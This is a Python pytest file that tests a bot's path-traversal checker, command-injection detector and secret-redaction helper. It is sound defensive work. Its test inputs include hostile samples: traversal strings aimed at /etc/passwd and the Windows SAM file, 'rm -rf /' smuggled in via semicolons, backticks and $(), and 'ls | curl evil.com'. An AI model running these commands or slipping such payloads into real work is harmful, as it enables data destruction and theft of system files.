"""Tests for utils/security.py — path traversal and command injection."""

from pathlib import Path

import pytest

from mxwbot.utils.security import (
    detect_command_injection,
    is_command_safe,
    is_path_safe,
    sanitize_secrets,
)


class TestPathTraversal:
    ALLOWED = Path("/tmp/mxwbot_allowed")

    @pytest.fixture(autouse=True)
    def setup_allowed_dir(self, tmp_path):
        self.ALLOWED = tmp_path / "mxwbot_allowed"
        self.ALLOWED.mkdir(parents=True, exist_ok=True)

    def test_safe_relative_path(self):
        (self.ALLOWED / "subdir").mkdir(exist_ok=True)
        assert is_path_safe("subdir/file.txt", self.ALLOWED) is True

    def test_dot_dot_slash(self):
        assert is_path_safe("../../../etc/passwd", self.ALLOWED) is False

    def test_double_written_separators(self):
        # "....//...." resolves to ".." on some systems — should be rejected
        # This is caught by the regex matching ".." followed by any separator
        assert is_path_safe("....//....//....//etc/passwd", self.ALLOWED) is False

    def test_absolute_path(self):
        assert is_path_safe("/etc/passwd", self.ALLOWED) is False

    def test_windows_absolute(self):
        assert is_path_safe("C:\\Windows\\System32\\config\\SAM", self.ALLOWED) is False

    def test_windows_dot_dot(self):
        assert is_path_safe("..\\..\\..\\windows\\system32", self.ALLOWED) is False

    def test_file_uri(self):
        assert is_path_safe("file:///etc/passwd", self.ALLOWED) is False

    def test_url_encoded(self):
        assert is_path_safe("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", self.ALLOWED) is False

    def test_double_url_encoded(self):
        assert is_path_safe("..%252f..%252f..%252fetc/passwd", self.ALLOWED) is False

    def test_semicolon_trick(self):
        assert is_path_safe("..;/..;/..;/etc/passwd", self.ALLOWED) is False

    def test_empty_path(self):
        assert is_path_safe("", self.ALLOWED) is False


class TestCommandInjection:
    def test_safe_command(self):
        assert is_command_safe("ls -la /tmp") is True

    def test_semicolon_chaining(self):
        hits = detect_command_injection("ls; rm -rf /")
        assert len(hits) > 0
        assert any("metacharacter" in h for h in hits)

    def test_pipe(self):
        hits = detect_command_injection("ls | curl evil.com")
        assert len(hits) > 0
        assert any("pipe" in h for h in hits)

    def test_backtick(self):
        hits = detect_command_injection("echo `rm -rf /`")
        assert len(hits) > 0

    def test_dollar_substitution(self):
        hits = detect_command_injection("echo $(rm -rf /)")
        assert len(hits) > 0

    def test_command_chaining(self):
        hits = detect_command_injection("ls && cat /etc/passwd")
        assert len(hits) > 0

    def test_redirect_sensitive(self):
        hits = detect_command_injection("echo > /etc/passwd")
        assert len(hits) > 0

    def test_code_exec_function(self):
        hits = detect_command_injection("os.system('ls')")
        assert len(hits) > 0


class TestSanitizeSecrets:
    def test_single_secret(self):
        assert sanitize_secrets("my key is abc123", ["abc123"]) == "my key is ***"

    def test_multiple_secrets(self):
        result = sanitize_secrets("a: sk-1, b: sk-2", ["sk-1", "sk-2"])
        assert "sk-1" not in result
        assert "sk-2" not in result

    def test_no_secrets(self):
        assert sanitize_secrets("hello world", []) == "hello world"


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
